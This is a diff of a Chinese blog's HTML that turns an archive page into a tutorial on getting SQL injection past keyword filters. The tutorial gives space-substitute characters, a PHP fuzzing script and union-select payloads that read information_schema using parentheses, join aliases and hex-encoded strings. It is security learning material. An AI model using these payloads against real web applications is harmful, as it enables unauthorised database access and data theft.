@@ -6,16 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://black0saturday.github.io">
-  <title>Archives: 2019 | 一次就好</title>
+  <title>SQL注入绕过过滤 | 一次就好</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="人生若只如初见">
-<meta property="og:type" content="website">
-<meta property="og:title" content="一次就好">
-<meta property="og:url" content="http://black0saturday.github.io/archives/2019/index.html">
+  <meta name="description" content="前言SQL注入经常会遇到过滤的问题，某些关键字被过滤导致注入无法进行下去，这里就总结一下常见的绕过过滤的方法。（本文参考Freebuf文章）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入绕过过滤">
+<meta property="og:url" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/index.html">
 <meta property="og:site_name" content="一次就好">
-<meta property="og:description" content="人生若只如初见">
+<meta property="og:description" content="前言SQL注入经常会遇到过滤的问题，某些关键字被过滤导致注入无法进行下去，这里就总结一下常见的绕过过滤的方法。（本文参考Freebuf文章）">
+<meta property="og:image" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/1.png">
+<meta property="og:image" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/2.png">
+<meta property="og:image" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/3.png">
+<meta property="og:image" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/4.png">
+<meta property="og:image" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/5.png">
+<meta property="og:image" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/6.png">
+<meta property="og:image" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/7.png">
+<meta property="og:image" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/8.png">
+<meta property="article:published_time" content="2018-11-25T08:05:47.000Z">
+<meta property="article:modified_time" content="2020-04-10T09:07:40.356Z">
 <meta property="article:author" content="布布f">
+<meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/1.png">
   
     <link rel="alternative" href="/atom.xml" title="一次就好" type="application/atom+xml">
   
@@ -167,60 +179,271 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-SQL注入绕过过滤" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/" class="archive-article-date">
-  	<time datetime="2019-11-20T08:43:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-20</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/">制作图片马</a>
+    <h1 class="article-title" itemprop="name">
+      SQL注入绕过过滤
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/" class="archive-article-date">
+  	<time datetime="2018-11-25T08:05:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL注入经常会遇到过滤的问题，某些关键字被过滤导致注入无法进行下去，这里就总结一下常见的绕过过滤的方法。（本文参考Freebuf文章）</p>
+<a id="more"></a>
+<p>过滤空格应该是最常见的防御措施了，替换空格的方法有很多：</p>
+<h4 id="1-替换空格"><a href="#1-替换空格" class="headerlink" title="1. /**/替换空格"></a>1. /**/替换空格</h4><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/1.png" alt></p>
+<h3 id="2-0x0a字符替换空格"><a href="#2-0x0a字符替换空格" class="headerlink" title="2. 0x0a字符替换空格"></a>2. 0x0a字符替换空格</h3><p>注意:按住alt键+小键盘输入10再松开alt键即可在控制台中输入ascii字符0x0a<br><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/2.png" alt></p>
+<h3 id="3-0x0b"><a href="#3-0x0b" class="headerlink" title="3. 0x0b"></a>3. 0x0b</h3><p>注意:按住alt键+小键盘输入11再松开alt键即可在控制台中输入ascii字符0x0b</p>
+<p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/3.png" alt></p>
+<h3 id="4-0x0c"><a href="#4-0x0c" class="headerlink" title="4. 0x0c"></a>4. 0x0c</h3><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/4.png" alt></p>
+<h3 id="5-0x0d"><a href="#5-0x0d" class="headerlink" title="5. 0x0d"></a>5. 0x0d</h3><p>使用0x0d号字符替换空格，注意:按住alt键+小键盘输入13再松开alt键即可在控制台中输入ascii字符0x0d,但因为在控制台中一旦输入0x0d，就会执行指令，所以这里只在union前输入了一次。</p>
+<p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/5.png" alt></p>
+<hr>
+<p>做到这里会不会想到其他可以替换空格的字符呢，fuzz测试一下：</p>
+<pre><code>&lt;?php
+$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;&apos;, &apos;mysql&apos;);
+if ($mysqli-&gt;connect_errno) {
+    die(&quot;could not connect to the database:\n&quot; . $mysqli-&gt;connect_error);
+}
+$i=0;
+while($i++&lt;256){
+    $sql = &quot;select host,user from user where user=&apos;a&apos;&quot;.chr($i).&quot;union&quot;.chr($i).&quot;select 1,2;&quot;;
+    $res = $mysqli-&gt;query($sql);
+    if ($res) {
+        echo &quot;Ok!:$i:&quot;.chr($i).&quot;&lt;br&gt;&quot;;
+    }    
+}
+$mysqli-&gt;close();
+?&gt;
+</code></pre><p>将代码放入网页中访问，显示：<br><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/6.png" alt></p>
+<p>通过测试可以发现，除了刚才用的还有9号(tab)和160号字符也可以替换空格。<br>32号本来就是空格，35是注释符</p>
+<hr>
+<p>然后如果这些都被过滤了，有没有别的办法</p>
+<h3 id="1-利用括号、反引号"><a href="#1-利用括号、反引号" class="headerlink" title="1. 利用括号、反引号"></a>1. 利用括号、反引号</h3><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/7.png" alt><br>    select host,user from user where user=’a’union(select<code>table_name</code>,<code>table_type</code>from<code>information_schema</code>.<code>tables</code>);<br>利用括号、反引号来隔离sql关键词与库名表名列名，完成了注入。</p>
+<h3 id="2-join语句和子查询的别名来替换逗号"><a href="#2-join语句和子查询的别名来替换逗号" class="headerlink" title="2. join语句和子查询的别名来替换逗号"></a>2. join语句和子查询的别名来替换逗号</h3><p><img src="/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/8.png" alt><br>在这个语句中，我们利用join与别名，成功的避免使用逗号实现了注入：</p>
+<pre><code>select host,user from user where user=&apos;a&apos;union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`=&apos;mysql&apos;)`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`=&apos;mysql&apos;)b));
+</code></pre><p>像这种嵌套语句，好像可以多次嵌套，比如：</p>
+<pre><code>select*from(select&apos;1&apos;)a2
+select*from(select*from(select&apos;1&apos;)a2)a3
+select*from(select*from(select*from(select&apos;1&apos;)a2)a3)a4
+select*from(select*from(select*from(select*from(select&apos;1&apos;)a2)a3)a4)a5
+</code></pre><h3 id="3-绕过反引号"><a href="#3-绕过反引号" class="headerlink" title="3. 绕过反引号"></a>3. 绕过反引号</h3><p>在库名、表名、列名不带空格、<em>、{、}等特殊符号的情况下，语句中的反引号也可以用括号代替<br>    select host,user from user where user=’a’union(select</em>from(((select(table_name)from(information_schema.tables)where(table_schema)=’mysql’)a)join(select(table_type)from(information_schema.tables)where(table_schema)=’mysql’)b));</p>
+<h3 id="4-过滤单引号"><a href="#4-过滤单引号" class="headerlink" title="4. 过滤单引号"></a>4. 过滤单引号</h3><p><strong>如果存在宽字节注入</strong>，那么即使过滤了单引号，我们也可以注入，这时语句变成这样：<br>    select host,user from user where user=’a?’union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)=0x6D7973716C)a)join(select(table_type)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));</p>
+<h3 id="5-其他技巧"><a href="#5-其他技巧" class="headerlink" title="5.其他技巧"></a>5.其他技巧</h3><p>某些web应用只取查询结果的第一行，这时可以使用group_concat()来获取完整数据,例如：</p>
+<pre><code>select host,user from user where user=&apos;a?&apos;union(select*from(((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=0x6D7973716C)a)join(select(table_type)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));
+</code></pre><p>也可以多加几个条件判断来逐行获取所要的数据：</p>
+<pre><code>select host,user from user where user=&apos;a?&apos;union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)=(0x6D7973716C)and(table_name)!=(0x6462)and(table_name)!=(0x67687478).......)a)join(select(0x77)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));
+</code></pre>
+      
+
+		
+		
+		  <div>
+			<blockquote>
+				<strong>本文作者：</strong>
+				
+				  布布f
+				
+				<br>
+				<strong>本文链接：</strong>
+				http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/
+				<br>
+				<strong>版权声明：</strong>
+				本作品采用
+				<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>
+				进行许可。转载请注明出处！
+				
+				  <br>
+				  <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"/></a>
+				
+			</blockquote>
+			
+			
+			<hr>
+				<center><strong>感谢有你，伴我成长。</strong></center>
+			<hr>
+		  </div>
+		
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢客观的赏<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/wechat.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://black0saturday.github.io/2018/11/25/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2018/11/30/str-replace%E5%87%BD%E6%95%B0%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          str_replace函数导致文件包含漏洞
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2018/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">制作图片马</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-替换空格"><span class="toc-number">1.0.1.</span> <span class="toc-text">1. &#x2F;**&#x2F;替换空格</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-0x0a字符替换空格"><span class="toc-number">1.1.</span> <span class="toc-text">2. 0x0a字符替换空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-0x0b"><span class="toc-number">1.2.</span> <span class="toc-text">3. 0x0b</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-0x0c"><span class="toc-number">1.3.</span> <span class="toc-text">4. 0x0c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-0x0d"><span class="toc-number">1.4.</span> <span class="toc-text">5. 0x0d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-利用括号、反引号"><span class="toc-number">1.5.</span> <span class="toc-text">1. 利用括号、反引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-join语句和子查询的别名来替换逗号"><span class="toc-number">1.6.</span> <span class="toc-text">2. join语句和子查询的别名来替换逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-绕过反引号"><span class="toc-number">1.7.</span> <span class="toc-text">3. 绕过反引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-过滤单引号"><span class="toc-number">1.8.</span> <span class="toc-text">4. 过滤单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-其他技巧"><span class="toc-number">1.9.</span> <span class="toc-text">5.其他技巧</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -243,8 +466,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
@@ -317,11 +540,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+                <a href="javascript:void(0)" class="js-tag color4">SQL</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">PHP</a>
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -329,19 +552,27 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CMS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">docker</a>
+                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+                <a href="javascript:void(0)" class="js-tag color4">PHP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CMS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">docker</a>
               </li>
              
               <li class="article-tag-list-item">
